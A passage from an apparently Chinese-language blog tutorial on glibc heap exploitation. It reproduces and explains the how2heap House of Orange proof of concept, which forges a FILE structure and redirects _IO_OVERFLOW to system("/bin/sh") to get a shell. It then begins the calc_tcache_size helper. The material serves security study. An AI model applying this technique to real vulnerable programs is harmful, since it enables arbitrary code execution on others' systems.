</span></span><span class=line><span class=cl>    <span class=n>top</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>p1</span> <span class=o>+</span> <span class=mh>0x400</span> <span class=o>-</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>top</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xc01</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>       Now we request a chunk of size larger than the size of the Top chunk.
</span></span></span><span class=line><span class=cl><span class=cm>       Malloc tries to service this request by extending the Top chunk
</span></span></span><span class=line><span class=cl><span class=cm>       This forces sysmalloc to be invoked.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In the usual scenario, the heap looks like the following
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------...----|
</span></span></span><span class=line><span class=cl><span class=cm>          |    chunk   |    chunk   | Top  ...    |
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------...----|
</span></span></span><span class=line><span class=cl><span class=cm>      heap start                              heap end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       And the new area that gets allocated is contiguous to the old heap end.
</span></span></span><span class=line><span class=cl><span class=cm>       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In order to keep track of this change in size, malloc uses a fencepost chunk,
</span></span></span><span class=line><span class=cl><span class=cm>       which is basically a temporary chunk.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       After the size of the Top chunk has been updated, this chunk gets freed.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In our scenario however, the heap looks like
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>     heap start                            heap end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
</span></span></span><span class=line><span class=cl><span class=cm>       So the area between the second chunk and the heap end is unused.
</span></span></span><span class=line><span class=cl><span class=cm>       And the old Top chunk gets freed.
</span></span></span><span class=line><span class=cl><span class=cm>       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
</span></span></span><span class=line><span class=cl><span class=cm>       it gets added to list of unsorted bins.
</span></span></span><span class=line><span class=cl><span class=cm>       Now we request a chunk of size larger than the size of the top chunk.
</span></span></span><span class=line><span class=cl><span class=cm>       This forces sysmalloc to be invoked.
</span></span></span><span class=line><span class=cl><span class=cm>       And ultimately invokes _int_free
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       Finally the heap looks like this:
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>          |    chunk   |    chunk   | free ..  |  ...  | new Top |
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>     heap start                                             new heap end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      Note that the above chunk will be allocated in a different page
</span></span></span><span class=line><span class=cl><span class=cm>      that gets mmapped. It will be placed after the old heap&#39;s end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Here starts phase two of the attack. We assume that we have an overflow into the old
</span></span></span><span class=line><span class=cl><span class=cm>      top chunk so we could overwrite the chunk&#39;s size.
</span></span></span><span class=line><span class=cl><span class=cm>      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
</span></span></span><span class=line><span class=cl><span class=cm>      of this chunk in the unsorted bin list.
</span></span></span><span class=line><span class=cl><span class=cm>      There are two common ways to exploit the current state:
</span></span></span><span class=line><span class=cl><span class=cm>        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
</span></span></span><span class=line><span class=cl><span class=cm>        - Use the unlinking of the chunk for an *where*-controlled write of the
</span></span></span><span class=line><span class=cl><span class=cm>          libc&#39;s main_arena unsorted-bin-list. (requires at least one allocation)
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The former attack is pretty straight forward to exploit, so we will only elaborate
</span></span></span><span class=line><span class=cl><span class=cm>      on a variant of the latter, developed by Angelboy in the blog post linked above.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The attack is pretty stunning, as it exploits the abort call itself, which
</span></span></span><span class=line><span class=cl><span class=cm>      is triggered when the libc detects any bogus state of the heap.
</span></span></span><span class=line><span class=cl><span class=cm>      Whenever abort is triggered, it will flush all the file pointers by calling
</span></span></span><span class=line><span class=cl><span class=cm>      _IO_flush_all_lockp. Eventually, walking through the linked list in
</span></span></span><span class=line><span class=cl><span class=cm>      _IO_list_all and calling _IO_OVERFLOW on them.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
</span></span></span><span class=line><span class=cl><span class=cm>      _IO_OVERLOW points to system and whose first 8 bytes are set to &#39;/bin/sh&#39;, so
</span></span></span><span class=line><span class=cl><span class=cm>      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#39;/bin/sh&#39;).
</span></span></span><span class=line><span class=cl><span class=cm>      More about file-pointer exploitation can be found here:
</span></span></span><span class=line><span class=cl><span class=cm>      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
</span></span></span><span class=line><span class=cl><span class=cm>      currently point to the libc&#39;s main_arena.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io_list_all</span> <span class=o>=</span> <span class=n>top</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x9a8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      We plan to overwrite the fd and bk pointers of the old top,
</span></span></span><span class=line><span class=cl><span class=cm>      which has now been added to the unsorted bins.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      When malloc tries to satisfy a request by splitting this free chunk
</span></span></span><span class=line><span class=cl><span class=cm>      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list
</span></span></span><span class=line><span class=cl><span class=cm>      in libc&#39;s main_arena.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Note that this overwrite occurs before the sanity check and therefore, will occur in any
</span></span></span><span class=line><span class=cl><span class=cm>      case.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.
</span></span></span><span class=line><span class=cl><span class=cm>      So, we should set chunk-&gt;bk to be _IO_list_all - 16
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>top</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>io_list_all</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      At the end, the system function will be invoked with the pointer to this file pointer.
</span></span></span><span class=line><span class=cl><span class=cm>      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>top</span><span class=p>,</span> <span class=s>&#34;/bin/sh</span><span class=se>\x00</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      The function _IO_flush_all_lockp iterates through the file pointer linked-list
</span></span></span><span class=line><span class=cl><span class=cm>      in _IO_list_all.
</span></span></span><span class=line><span class=cl><span class=cm>      Since we can only overwrite this address with main_arena&#39;s unsorted-bin-list,
</span></span></span><span class=line><span class=cl><span class=cm>      the idea is to get control over the memory at the corresponding fd-ptr.
</span></span></span><span class=line><span class=cl><span class=cm>      The address of the next file pointer is located at base_address+0x68.
</span></span></span><span class=line><span class=cl><span class=cm>      This corresponds to smallbin-4, which holds all the smallbins of
</span></span></span><span class=line><span class=cl><span class=cm>      sizes between 90 and 98. For further information about the libc&#39;s bin organisation
</span></span></span><span class=line><span class=cl><span class=cm>      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Since we overflow the old top chunk, we also control it&#39;s size field.
</span></span></span><span class=line><span class=cl><span class=cm>      Here it gets a little bit tricky, currently the old top chunk is in the
</span></span></span><span class=line><span class=cl><span class=cm>      unsortedbin list. For each allocation, malloc tries to serve the chunks
</span></span></span><span class=line><span class=cl><span class=cm>      in this list first, therefore, iterates over the list.
</span></span></span><span class=line><span class=cl><span class=cm>      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
</span></span></span><span class=line><span class=cl><span class=cm>      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
</span></span></span><span class=line><span class=cl><span class=cm>      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
</span></span></span><span class=line><span class=cl><span class=cm>      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
</span></span></span><span class=line><span class=cl><span class=cm>      therefore, occupying the smallbin[4] location in the main_arena and
</span></span></span><span class=line><span class=cl><span class=cm>      eventually representing the fake file pointer&#39;s fd-ptr.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      In addition to sorting, malloc will also perform certain size checks on them,
</span></span></span><span class=line><span class=cl><span class=cm>      so after sorting the old top chunk and following the bogus fd pointer
</span></span></span><span class=line><span class=cl><span class=cm>      to _IO_list_all, it will check the corresponding size field, detect
</span></span></span><span class=line><span class=cl><span class=cm>      that the size is smaller than MINSIZE &#34;size &lt;= 2 * SIZE_SZ&#34;
</span></span></span><span class=line><span class=cl><span class=cm>      and finally triggering the abort call that gets our chain rolling.
</span></span></span><span class=line><span class=cl><span class=cm>      Here is the corresponding code in the libc:
</span></span></span><span class=line><span class=cl><span class=cm>      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>top</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x61</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      Now comes the part where we satisfy the constraints on the fake file pointer
</span></span></span><span class=line><span class=cl><span class=cm>      required by the function _IO_flush_all_lockp and tested here:
</span></span></span><span class=line><span class=cl><span class=cm>      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      We want to satisfy the first condition:
</span></span></span><span class=line><span class=cl><span class=cm>      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>_IO_FILE</span> <span class=o>*</span><span class=n>fp</span> <span class=o>=</span> <span class=p>(</span><span class=n>_IO_FILE</span> <span class=o>*</span><span class=p>)</span> <span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      1. Set mode to 0: fp-&gt;_mode &lt;= 0
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// top+0xc0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>2</span><span class=p>;</span> <span class=c1>// top+0x20
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>3</span><span class=p>;</span> <span class=c1>// top+0x28
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      4) Finally set the jump table to controlled memory and place system there.
</span></span></span><span class=line><span class=cl><span class=cm>      The jump table pointer is right after the _IO_FILE struct:
</span></span></span><span class=line><span class=cl><span class=cm>      base_address+sizeof(_IO_FILE) = jump_table
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=o>*</span><span class=n>jump_table</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>top</span><span class=p>[</span><span class=mi>12</span><span class=p>];</span> <span class=c1>// controlled memory
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>jump_table</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>winner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>fp</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>_IO_FILE</span><span class=p>))</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>jump_table</span><span class=p>;</span> <span class=c1>// top+0xd8
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Finally, trigger the whole chain by calling malloc */</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     The libc&#39;s error message will be printed to the screen
</span></span></span><span class=line><span class=cl><span class=cm>     But you&#39;ll get a shell anyways.
</span></span></span><span class=line><span class=cl><span class=cm>   */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>winner</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出就没有必要放了。</p><p>先申请了实际大小为 0x400 的 chunk，然后为了满足页对齐以及 top chunk 的 <code>PREV_INUSE</code> 位的条件，通过溢出修改 top chunk 的 <code>size</code> 为 <code>0xc01</code>。此时，如果我们再申请一个 top chunk 大小不能满足的 chunk，就会申请新的 top chunk，而 old top 进入 unsorted bin 中。</p><p>接下来，我们利用 libc 的异常处理程序 getshell。出现异常并终止程序时，会调用 <code>_IO_flush_all_lockp</code>，遍历 <code>_IO_list_all</code> 并对它们依次调用 <code>_IO_OVERFLOW</code>。不难想到，如果伪造 <code>_IO_list_all</code> 指针的前 8 字节为 <code>/bin/sh\x00</code>，再伪造 <code>_IO_OVERFLOW</code> 为 <code>system</code>，就可以达到目的。其中，<code>_IO_list_all</code> 地址可由已经在 unsorted bin 中的 old top 的 fd 也就是 <code>main_arena+88</code> 推算出来。</p><p>如果我们后续要切割这块 old top 来满足内存申请，那么 <code>old_top->bk->fd</code> 会被覆盖为 <code>main_arena+88</code>，这和 unsorted bin attack 涉及的原理是一样的。那么我们希望覆盖 <code>_IO_list_all</code> 为 <code>main_arena+88</code>，只需要令 <code>old_top->bk = io_list_all-0x10</code> 即可，其中 <code>io_list_all</code> 表示 <code>_IO_list_all</code> 的地址。但问题在于，用于覆盖的值 <code>main_arena+88</code> 不是我们可控的值，因此我们期望能控制其 fd 指针。</p><p>已知下一个文件指针位于文件指针地址 <code>+0x68</code> 处，这恰好对应于 <code>smallbin[4]</code>，存放大小为 <code>90-98</code> 之间的 small chunk。如果我们设置 old top 的大小为 <code>0x61</code>，然后申请一个小块使得 old top 不会被分配出去，那么它就会进入到 <code>smallbin[4]</code> 中，成为链表头，同时也成为了我们伪造的文件指针的 fd 指针。</p><p>然后用 old top 伪造文件指针，满足这几个条件：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      1. Set mode to 0: fp-&gt;_mode &lt;= 0
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// top+0xc0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>2</span><span class=p>;</span> <span class=c1>// top+0x20
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=mi>3</span><span class=p>;</span> <span class=c1>// top+0x28
</span></span></span></code></pre></div><p>最后，覆盖 <code>_IO_jump_t[3]</code> 也就是 <code>_IO_OVERFLOW</code> 使其指向 <code>winner</code> 函数，或者说 <code>system</code> 函数。</p><h2 id=calc_tcache_size class="relative group">calc_tcache_size <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#calc_tcache_size aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span>      <span class=n>mchunk_prev_size</span><span class=p>;</span>  <span class=cm>/* Size of previous chunk (if free).  */</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span>      <span class=n>mchunk_size</span><span class=p>;</span>       <span class=cm>/* Size in bytes, including overhead. */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>         <span class=cm>/* double links -- used only if free. */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Only used for large blocks: pointer to next larger size.  */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd_nextsize</span><span class=p>;</span> <span class=cm>/* double links -- used only if free. */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk_nextsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* The corresponding word size.  */</span>
</span></span><span class=line><span class=cl><span class=cp>#define SIZE_SZ (sizeof (size_t))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \
</span></span></span><span class=line><span class=cl><span class=cp>              ? __alignof__ (long double) : 2 * SIZE_SZ)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* The corresponding bit mask value.  */</span>
</span></span><span class=line><span class=cl><span class=cp>#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* The smallest possible chunk */</span>
</span></span><span class=line><span class=cl><span class=cp>#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* The smallest size we can malloc is an aligned minimal chunk */</span>
</span></span><span class=line><span class=cl><span class=cp>#define MINSIZE  \
</span></span></span><span class=line><span class=cl><span class=cp>  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define request2size(req)                                         \
</span></span></span><span class=line><span class=cl><span class=cp>  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt;MINSIZE)  ?             \
</span></span></span><span class=line><span class=cl><span class=cp>   MINSIZE :                                                      \
</span></span></span><span class=line><span class=cl><span class=cp>   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* When &#34;x&#34; is from chunksize().  */</span>
</span></span><span class=line><span class=cl><span class=cp># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* When &#34;x&#34; is a user-provided size.  */</span>
</span></span><span class=line><span class=cl><span class=cp># define usize2tidx(x) csize2tidx (request2size (x))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>req</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>tidx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file doesn&#39;t demonstrate an attack, but calculates the tcache idx for a given chunk size.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The basic formula is as follows:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>On a 64 bit system the current values are:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>MINSIZE: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>MALLOC_ALIGNMENT: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MALLOC_ALIGNMENT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>So we get the following equation:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>(IDX = CHUNKSIZE - 0x%lx) / 0x%lx</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=o>-</span><span class=n>MALLOC_ALIGNMENT</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>MALLOC_ALIGNMENT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;BUT be AWARE that CHUNKSIZE is not the x in malloc(x)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
